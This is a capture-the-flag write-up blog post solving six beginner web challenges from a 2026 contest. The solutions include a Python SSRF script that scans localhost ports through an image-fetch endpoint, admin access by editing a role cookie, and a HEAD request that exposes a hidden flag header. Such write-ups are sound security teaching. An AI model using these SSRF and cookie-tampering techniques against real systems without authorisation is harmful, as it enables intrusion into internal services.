---
layout: post
title:  "Web Challenges"
date:   2026-08-04 18:00:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /LIT-CTF-2026-web/
---
* TOC
{:toc}
## my first ctf

**Author**: halp

**Category**: web

**Description**: Your classic beginner CTF problem. `http://136.115.87.65:31771/`

```shell
curl http://136.115.87.65:31771/  
<!DOCTYPE html>  
<html lang="en">  
<head>  
	<meta charset="UTF-8">  
	<meta name="viewport" content="width=device-width, initial-scale=1.0">  
	<title>Baby's first CTF challenge</title>  
</head>  
<body>  
	there's a flag on this page! somewhere...  
	good luck finding it!  
	<!-- LITCTF{n1ce_w0rk_dsf3kw} -->  
</body>  
</html>
```

`LITCTF{n1ce_w0rk_dsf3kw}`

___

## cookie monster

**Author**: Bhavy

**Category**: web

**Description**: om nom nom `http://136.115.87.65:31775/`

I go to the site:

![Alt text](/images/litctfweb1.png)

I have a cookie named `role` with the value `guest`. Change the value to `admin` and refresh the page:

![Alt text](/images/litctfweb2.png)

`flag{c00k13_m0n5t3r_v4l1d4t10n}`

___

## color palette

**Author**: joshadoodle

**Category**: web

**Description**: Say hello to the new LIT logo colors! They will adorn our new flag. Don't you love the look? `http://136.115.87.65:31774/`

```shell
curl http://136.115.87.65:31774/  
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>New LIT Color Palette</title>
    <style>
      body {
        display: flex;
        justify-content: center;
      }

      .colors {
        width: 50%;
        height: 50%;
      }
    </style>
  </head>
  <body>
    <div class="colors">
      <svg id="triangle" viewBox="0 0 200 200">
        <polygon points="100 0, 100 100, 172 28" fill="#4c4954" />
        <polygon points="200 100, 100 100, 172 28" fill="#435446" />
        <polygon points="200 100, 100 100, 172 172" fill="#7b6e33" />
        <polygon points="100 200, 100 100, 172 172" fill="#772d66" />
        <polygon points="100 200, 100 100, 28 172" fill="#4c4167" />
        <polygon points="0 100, 100 100, 28 172" fill="#2d6330" />
        <polygon points="0 100, 100 100, 28 28" fill="#4c4f52" />
        <polygon points="100 0, 100 100, 28 28" fill="#213f7d" />
      </svg>
    </div>
  </body>
</html>
```

The hex values decode to the flag:
```shell
echo '4c49544354467b6e33772d664c41672d63304c4f52213f7d' | xxd -r -p  
LITCTF{n3w-fLAg-c0LOR!?}
```

`LITCTF{n3w-fLAg-c0LOR!?}`

___

## world cup chat

**Author**: Ninjaprime

**Category**: web

**Description**: After the Brazil vs Morocco World Cup game on Saturday, June 13, 2026, Vini Jr. and Achraf Hakimi were chatting about a secret flag for LIT.  
As their conversation happened, a spy recorded their every word, sending it to a news outlet. The spy's words were encrypted in a very weird way. Can you help us recover their original message? `http://136.115.87.65:31772/`

Looking at the site:
```shell
curl http://136.115.87.65:31772/  
<!DOCTYPE html>  
<html lang="en">  
<head>  
  <meta charset="UTF-8">  
  <title>World Cup Post-Game Chat</title>  
</head>  
<body>  
<h1>World Cup Post-Game Chat</h1>  
<p>Vini Jr.: &amp;#111;&amp;#102;&amp;#102;&amp;#115;&amp;#101;&amp;#116;=&amp;#54;&amp;#55;</p>  
<p>Achraf Hakimi: &#143;&#140;&#151;&#134;&#151;&#137;&#190;&#168;&#177;&#183;&#116;&#183;&#188;</p>  
<img src="soccer.jpg" alt="&#162;&#176;&#119;&#170;&#116;&#166;&#162;&#116;&#169;&#173;&#116;&#115;">  
<p style="text-align: right;">&#167;&#192;</p>  
</body>  
</html>
```

From the page this message:
```shell
&#111;&#102;&#102;&#115;&#101;&#116;=&#54;&#55;
```
Translates to:
```shell
offset = 67
```
[cyberchef recipe](https://gchq.github.io/CyberChef/#recipe=From_HTML_Entity()From_Quoted_Printable()&input=JiMxMTE7JiMxMDI7JiMxMDI7JiMxMTU7JiMxMDE7JiMxMTY7ID0gJiM1NDsmIzU1Ow)

Take the other values and subtract `67`:
```python
python3  
Python 3.13.5 (main, Jul 15 2026, 20:25:40) [GCC 14.2.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> encrypted = [143, 140, 151, 134, 151, 137, 190, 168, 177, 183, 116, 183, 188, 162, 176, 119, 170, 116, 166, 162, 116, 169, 173, 116, 115, 167, 192]  
... offset = 67  
...  
... flag = ''.join(chr(code - offset) for code in encrypted)  
... print(flag)  
...  
LITCTF{ent1ty_m4g1c_1fj10d}  
```

`LITCTF{ent1ty_m4g1c_1fj10d}`

___

## image fetcher

**Author**: ethan

**Category**: web

**Description**: I built this website to fetch images from online, but I didn't do a very good job of securing it... `http://136.115.87.65:31770/`

Looking at the site:
```shell
curl http://136.115.87.65:31770/  
  
	<h1>Welcome to Image Fetcher</h1>  
	<p>Use /fetch?url=http://example.com/image.jpg</p>  
	<p>You might also like to know that my local machine only uses port 5000-6000 ;)</p>  
	<p>Oh, and /fetch is rate limited to 25 req/s</p>
```

I make this script which will search on localhost through ports `5000-6000`:
```python
import requests
import time

BASE_URL = "http://136.115.87.65:31770/fetch"
PORTS = range(5000, 6001)
FLAG_PATTERNS = ("LITCTF{", "flag{")
RATE_LIMIT = 20
DELAY = 1.0 / RATE_LIMIT

def check_port(port):
    url = f"{BASE_URL}?url=http://127.0.0.1:{port}"
    try:
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            content = resp.text
            for pattern in FLAG_PATTERNS:
                if pattern in content:
                    print(f"Found flag on port {port}:")
                    for line in content.split('\n'):
                        if pattern in line:
                            print(line.strip())
                    return True
        else:
            print(f"Port {port} returned status {resp.status_code}")
    except Exception as e:
        print(f"Port {port} error: {e}")
    return False

for port in PORTS:
    if check_port(port):
        break
    time.sleep(DELAY)
```

Output:
```shell
python3 solve.py  
Found flag on port 5267:  
Not an image, but here you go: Nice! :) LITCTF{55rf_p0r7s_8e52df31}
```
or:
```shell
curl http://136.115.87.65:31770/fetch?url=http://127.0.0.1:5267  
Not an image, but here you go: Nice! :) LITCTF{55rf_p0r7s_8e52df31}
```

`LITCTF{55rf_p0r7s_8e52df31}`

___

## head

**Author**: halp

**Category**: web

**Description**: and shoulders knees and toes. `http://136.115.87.65:31784/`

I look at the site:
```shell
curl http://136.115.87.65:31784/  
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>__title__</title>
    <link rel="stylesheet" href="/_bun/asset/974749a53427e6d9.css">
    <script type="module" crossorigin src="/_bun/client/index-00000000d04718df.js" data-bun-dev-server-script></script>
    <script>
      ((a) => {
        document.addEventListener('visibilitychange', globalThis[Symbol.for('bun:loadData')] = () => document.visibilityState === 'hidden' && navigator.sendBeacon('/_bun/unref', a));
      })(document.querySelector('[data-bun-dev-server-script]').src.slice(-11, -3))
    </script>
  </head>
  <body class="h-screen w-full flex items-center flex-col justify-center font-mono px-20 bg-black text-white"> Head, shoulders, knees and toes, knees and toes.<br> Head, shoulders, knees and toes, knees and toes.<br> And eyes and ears and mouth and nose.<br> Head, shoulders, knees and toes, knees and toes. <a href="/flag" class="underline">here's the flag btw</a></body>
</html>
```

```shell
curl http://136.115.87.65:31784/flag  
can't find anything here...
```

I made a request to `/flag` with the [head](https://http.dev/head) request method:
```shell
curl --head http://136.115.87.65:31784/flag  
HTTP/1.1 200 OK  
x-flag: LITCTF{y0u_f0umd_h3@d_239seaj9}  
content-length: 0
```

`LITCTF{y0u_f0umd_h3@d_239seaj9}`